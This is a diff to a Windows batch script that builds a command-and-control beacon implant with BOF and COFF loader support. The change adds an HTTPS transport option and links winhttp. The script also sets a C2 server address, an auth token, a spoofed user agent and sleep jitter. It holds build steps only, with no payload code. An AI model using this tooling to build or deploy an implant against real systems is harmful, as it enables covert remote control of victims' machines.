@@ -18,6 +18,7 @@ set "C2_USER_AGENT=%~3"
 set "C2_AUTH_TOKEN=%~4"
 set "C2_SLEEP_BASE_MS=%~5"
 set "C2_SLEEP_JITTER_MS=%~6"
+set "C2_USE_HTTPS=%~7"
 
 if "%C2_SERVER_IP%"=="" set "C2_SERVER_IP=127.0.0.1"
 if "%C2_SERVER_PORT%"=="" set "C2_SERVER_PORT=8080"
@@ -25,11 +26,12 @@ if "%C2_USER_AGENT%"=="" set "C2_USER_AGENT=Mozilla/5.0"
 if "%C2_AUTH_TOKEN%"=="" set "C2_AUTH_TOKEN="
 if "%C2_SLEEP_BASE_MS%"=="" set "C2_SLEEP_BASE_MS=5000"
 if "%C2_SLEEP_JITTER_MS%"=="" set "C2_SLEEP_JITTER_MS=3000"
+if "%C2_USE_HTTPS%"=="" set "C2_USE_HTTPS=0"
 
 :: 2. Build Main Beacon Components
 echo [1/3] Compiling Beacon components...
 
-set BEACON_FLAGS=-c -O2 -I include -DBOF -DC2_SERVER_IP=\"%C2_SERVER_IP%\" -DC2_SERVER_PORT=%C2_SERVER_PORT% -DC2_USER_AGENT=\"%C2_USER_AGENT%\" -DC2_AUTH_TOKEN=\"%C2_AUTH_TOKEN%\" -DC2_SLEEP_BASE_MS=%C2_SLEEP_BASE_MS% -DC2_SLEEP_JITTER_MS=%C2_SLEEP_JITTER_MS%
+set BEACON_FLAGS=-c -O2 -I include -DBOF -DC2_SERVER_IP=\"%C2_SERVER_IP%\" -DC2_SERVER_PORT=%C2_SERVER_PORT% -DC2_USER_AGENT=\"%C2_USER_AGENT%\" -DC2_AUTH_TOKEN=\"%C2_AUTH_TOKEN%\" -DC2_SLEEP_BASE_MS=%C2_SLEEP_BASE_MS% -DC2_SLEEP_JITTER_MS=%C2_SLEEP_JITTER_MS% -DC2_USE_HTTPS=%C2_USE_HTTPS%
 
 echo Compiling beacon.c...
 x86_64-w64-mingw32-gcc %BEACON_FLAGS% src\beacon.c -o "%BUILD_DIR%\beacon.obj"
@@ -56,7 +58,7 @@ for %%f in (bofs\*.c) do (
 
 :: 4. Link Beacon Executable (add bcrypt)
 echo [3/3] Linking beacon.exe...
-x86_64-w64-mingw32-gcc "%BUILD_DIR%\beacon.obj" "%BUILD_DIR%\beacon_compatibility.obj" "%BUILD_DIR%\COFFLoader.obj" -o "%BUILD_DIR%\beacon.exe" -lws2_32 -lbcrypt
+x86_64-w64-mingw32-gcc "%BUILD_DIR%\beacon.obj" "%BUILD_DIR%\beacon_compatibility.obj" "%BUILD_DIR%\COFFLoader.obj" -o "%BUILD_DIR%\beacon.exe" -lws2_32 -lbcrypt -lwinhttp
 if !errorlevel! neq 0 (echo [!] Failed to link beacon.exe && pause && exit /b 1)
 
 :: 5. Deploy BOFs to server
